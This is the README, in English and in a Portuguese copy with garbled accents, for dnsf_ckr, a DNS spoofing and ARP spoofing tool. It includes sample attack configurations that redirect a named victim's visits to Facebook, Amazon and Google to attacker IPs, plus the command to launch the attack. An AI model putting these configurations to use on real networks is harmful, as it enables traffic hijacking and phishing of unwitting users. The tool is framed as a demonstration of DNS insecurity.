Dnsf_ckr
--------

``dnsf_ckr`` is an application used for messing up with domain names. Until now it works on FreeBSD and Linux.

The idea here is sniffing victim's dns requests and fake the response as soon as possible than real dns server.
In this way we can redirect the target machine to anywhere we want.

## Warning

This application is only for educational purposes. I wrote it to show how the DNS protocol can be unsecure in some
cases and I think you should use it with responsibility.

## Cloning this repo

This repository has some submodules then due to it you should:

``git clone https://github.com/rafael-santiago/dnsf_ckr.git --recursive dnsf_ckr``

or

``git clone https://github.com/rafael-santiago/dnsf_ckr.git dnsf_ckr``

``cd dnsf_ckr``

``git submodule update --init``

After this you will be able to build ``dnsf_ckr``

## How to build it?

In order to build ``dnsf_ckr`` you need to use [Hefesto](http://github.com/rafael-santiago/hefesto.git).

After follow the steps to install Hefesto in your system, all you need to do (on shell) inside ``dnsf_ckr`` src
subdirectory is invoke hefesto. Something like this:

    root@zephyr:~/src/dnsf_ckr/src# hefesto

"That's all folks!!"

;)

## Using ``dnsf_ckr``

At first you need to know three things

    * The victim's ip address
    * The victim's real DNS server IP
    * What domain names you wish to spoof

These informations must be supplied to ``dnsf_ckr`` through a configuration file.

Supposing that your victim is called "sheep" and has the ip address "192.30.70.9" and accesses the "www.facebook.com",
we have the following attack configuration:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites
        ;

        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.

        real-dns-transactions =
            sheep sends requests to cheap-server
        ;

Okay, now you want to add a new attack based on a new victim and also redirect the "sheep" to other wilder domains:

        victims =
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        real-dns-transactions =
            sheep sends requests to cheap-server
            obama sends requests to cheap-server
        ;

        fake-nameserver =
            with sheep mess up boring-sites, webcommerce-sites
            with obama mess up search-engines
        ;

Now, if the presented configuration data is into "my-dirty-little-hacking.conf" file... all we need to do is:

        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1

The option --iface indicates the name of the interface that you use to access the network.

### What about the dnsf_ckr-core section in .conf file?

Inside this section we can adjust some things related with ``dnsf_ckr`` internal system stuff.

These are the current entries that you can use to setup the application according your preferences.

|   *Entry*     |  *Type*  |                               *Used for*                                                 |
|:-------------:|:--------:|:----------------------------------------------------------------------------------------:|
|  dnsspf-ttl   |    int   | Indicates the time in seconds that the dns resolution will be cached on victim's machine |
| arpspf-pkt-nr |    int   | Indicates the number of arp packets sent to the victim on each arp spoof attempt.        |
| reqhandlers-nr|    int   | Indicates the number of simultaneous handlers for the captured packets.                  |


Have fun!


Dnsf_ckr
--------

``dnsf_ckr`` � uma aplica��o usada para bagun�ar com nomes de dom�nios. At� agora isso funciona no FreeBSD.

A ideia aqui � sniffar as requisi��es dns da v�tima e falsificar a resposta o quanto antes que o servidor dns real.
Dessa forma � poss�vel redirecionar a m�quina alvo para onde n�s quisermos.

## Aviso

Este aplicativo � para fins educativos apenas. Eu escrevi isso para mostrar como o protocolo DNS pode ser inseguro
em alguns casos e eu acho que voc� deveria usar isso com responsabilidade.

## Clonando este repo

Este reposit�rio possui alguns subm�dulos ent�o por conta disso voc� deve:

``git clone https://github.com/rafael-santiago/dnsf_ckr.git --recursive dnsf_ckr``

ou

``git clone https://github.com/rafael-santiago/dnsf_ckr.git dnsf_ckr``

``cd dnsf_ckr``

``git submodule update --init``

Depois disso voc� poder� disparar o build do ``dnsf_ckr``.

## Como compilar isso?

Para compilar o ``dnsf_ckr`` voc� precisa usar o [Hefesto](http://github.com/rafael-santiago/hefesto.git).

Depois de seguir os passos para instalar o Hefesto em seu sistema, tudo o que voc� precisa fazer (no shell)
dentro do subdiret�rio src do ``dnsf_ckr`` � invocar o hefesto. Algo nessa linha:

    root@zephyr:~/src/dnsf_ckr/src# hefesto

"E por hoje � s� pessoal!!"

;)

## Usando o ``dnsf_ckr``

Inicialmente voc� precisa saber tr�s coisas

    * O endere�o ip da v�tima
    * O endere�o ip do servidor DNS real da v�tima
    * Quais nomes de dom�nio voc� quer spoofar

Essas informa��es devem ser informadas ao ``dnsf_ckr`` atrav�s do arquivo de configura��o.

Supondo que sua v�tima � chamada "sheep" e tem o endere�o ip "192.30.70.9" e acessa o "www.facebook.com", n�s temos
a seguinte configura��o de ataque:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites
        ;

        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.

        real-dns-transactions =
            sheep sends requests to cheap-server
        ;

Certo, agora voc� quer adicionar um novo ataque baseado em uma nova v�tima e direcionar "sheep" para outros dom�nios mais selvagens:

        victims =
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        real-dns-transactions =
            sheep sends requests to cheap-server
            obama sends requests to cheap-server
        ;

        fake-nameserver =
            with sheep mess up boring-sites, webcommerce-sites
            with obama mess up search-engines
        ;

Agora, se os dados de configura��o apresentados est�o dentro do arquivo "my-dirty-little-hacking.conf"... tudo o que precisamos fazer �:

        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1

A op��o --iface indica o nome da interface que voc� usa para acessar a rede.

### Qual � da se��o dnsf_ckr-core dentro do arquivo .conf?

Dentro dessa se��o n�s podemos ajustar algumas coisas relacionadas com o sistema interno do ``dnsf_ckr``.

Estas s�o as entradas que atualmente voc� pode usar para colocar a aplica��o de acordo com o que voc� precisa.

|   *Entrada*   |  *Tipo*  |                               *Usada para*                                               |
|:-------------:|:--------:|:----------------------------------------------------------------------------------------:|
|  dnsspf-ttl   |    int   | Indicar o tempo em segundos que a resolu��o dns ser� cacheada na m�quina da v�tima.      |
| arpspf-pkt-nr |    int   | Indicar o n�mero de pacotes arp enviados para a v�tima � cada tentativa de arp spoof.    |
| reqhandlers-nr|    int   | Indicar o n�mero de tratadores simult�neos para os pacotes capturados.                   |

Divirta-se!
